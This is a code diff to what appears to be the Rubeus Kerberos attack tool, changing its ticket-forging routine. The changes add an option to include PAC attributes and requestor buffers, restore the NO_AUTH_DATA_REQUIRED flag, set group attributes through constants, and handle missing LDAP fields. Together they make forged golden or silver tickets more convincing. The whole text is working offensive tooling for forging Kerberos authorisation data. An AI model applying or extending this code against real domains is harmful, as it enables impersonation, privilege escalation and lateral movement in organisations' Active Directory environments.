@@ -61,6 +61,7 @@ namespace Rubeus
             string resourceGroupSid = "",
             List<int> resourceGroups = null,
             Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,
+            bool newPac = false,
             // arguments to deal with resulting ticket(s)
             string outfile = null,
             bool ptt = false,
@@ -298,11 +299,10 @@ namespace Rubeus
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
                         }
-                        /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
                         if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
-                        }*/
+                        }
                         if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
                         {
                             kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
@@ -396,7 +396,13 @@ namespace Rubeus
                                         maxPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MaximumPasswordAge"]);
                                         if (maxPassAge > 0)
                                         {
-                                            kvi.PasswordMustChange = new Ndr._FILETIME(((DateTime)userObject["pwdlastset"]).AddDays((double)maxPassAge));
+                                           DateTime pwdLastReset = (DateTime)userObject["pwdlastset"];
+                                            if (pwdLastReset == DateTime.MinValue)
+                                            {
+                                                DateTime dt = DateTime.Now;
+                                                pwdLastReset = dt.AddDays(-2);
+                                            }
+                                            kvi.PasswordMustChange = new Ndr._FILETIME((pwdLastReset.AddDays((double)maxPassAge)));
                                         }
                                     }
                                 }
@@ -404,7 +410,7 @@ namespace Rubeus
                                 {
                                     string groupSid = (string)o["objectsid"];
                                     int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
-                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
+                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
                                     c += 1;
                                 }
                             }
@@ -461,17 +467,24 @@ namespace Rubeus
                     {
                         kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                     }
-                    kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
-                    kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
-                    if ((DateTime)userObject["lastlogon"] != DateTime.MinValue)
+                    if (userObject.ContainsKey("logoncount"))
+                    {
+                        kvi.LogonCount = short.Parse((string)userObject["logoncount"]);
+                    }
+                    if (userObject.ContainsKey("badpwdcount"))
+                    {
+                        kvi.BadPasswordCount = short.Parse((string)userObject["badpwdcount"]);
+                    }
+                    if (userObject.ContainsKey("lastlogon") && ((DateTime)userObject["lastlogon"] != DateTime.MinValue))
                     {
                         kvi.LogonTime = new Ndr._FILETIME((DateTime)userObject["lastlogon"]);
                     }
-                    if ((DateTime)userObject["lastlogoff"] != DateTime.MinValue)
+                    
+                    if (userObject.ContainsKey("lastlogoff") && ((DateTime)userObject["lastlogoff"] != DateTime.MinValue))
                     {
                         kvi.LogoffTime = new Ndr._FILETIME((DateTime)userObject["lastlogoff"]);
                     }
-                    if ((DateTime)userObject["pwdlastset"] != DateTime.MinValue)
+                    if (userObject.ContainsKey("pwdlastset") && (DateTime)userObject["pwdlastset"] != DateTime.MinValue)
                     {
                         kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)userObject["pwdlastset"]);
                     }
@@ -540,7 +553,7 @@ namespace Rubeus
                 c = 0;
                 foreach (int gid in allGroups)
                 {
-                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, 7) }, 0, kvi.GroupIds, c, 1);
+                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.GroupIds, c, 1);
                     c += 1;
                 }
             }
@@ -552,7 +565,7 @@ namespace Rubeus
                 c = 0;
                 foreach (string s in sids.Split(','))
                 {
-                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
+                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), Interop.GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ExtraSids, c, 1);
                     c += 1;
                 }
             }
@@ -564,9 +577,10 @@ namespace Rubeus
                     kvi.ResourceGroupCount = resourceGroups.Count;
                     kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[resourceGroups.Count];
                     c = 0;
+
                     foreach (int rgroup in resourceGroups)
                     {
-                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, 7) }, 0, kvi.ResourceGroupIds, c, 1);
+                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, Interop.R_GROUP_ATTRIBUTES_DEFAULT) }, 0, kvi.ResourceGroupIds, c, 1);
                         c += 1;
                     }
                 }
@@ -825,6 +839,14 @@ namespace Rubeus
                     ticketSigData.Signature = decTicketPart.CalculateTicketChecksum(krbKey, kdcSigData.SignatureType);
                 }
 
+                Attributes attrib = null;
+                Requestor requestor = null;
+                if (newPac)
+                {
+                    attrib = new Attributes();
+                    requestor = new Requestor(String.Format("{0}-{1}", li.KerbValidationInfo.LogonDomainId?.GetValue(), li.KerbValidationInfo.UserId));
+                }
+
                 // clear signatures
                 Console.WriteLine("[*] Signing PAC");
                 svrSigData.Signature = new byte[svrSigLength];
@@ -841,6 +863,11 @@ namespace Rubeus
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
+                if (newPac)
+                {
+                    PacInfoBuffers.Add(attrib);
+                    PacInfoBuffers.Add(requestor);
+                }
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
                 if (ticketSigData != null)
@@ -863,6 +890,11 @@ namespace Rubeus
                 PacInfoBuffers.Add(li);
                 PacInfoBuffers.Add(cn);
                 PacInfoBuffers.Add(upnDns);
+                if (newPac)
+                {
+                    PacInfoBuffers.Add(attrib);
+                    PacInfoBuffers.Add(requestor);
+                }
                 PacInfoBuffers.Add(svrSigData);
                 PacInfoBuffers.Add(kdcSigData);
                 if (ticketSigData != null)
@@ -1103,7 +1135,7 @@ namespace Rubeus
                 }
                 if (kvi.ResourceGroupCount > 0)
                 {
-                        cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                    cmdOut = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", cmdOut, kvi.ResourceGroupDomainSid.GetValue().ToString(), kvi.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
                 }
                 if (!String.IsNullOrEmpty(kvi.LogonServer.ToString()))
                 {
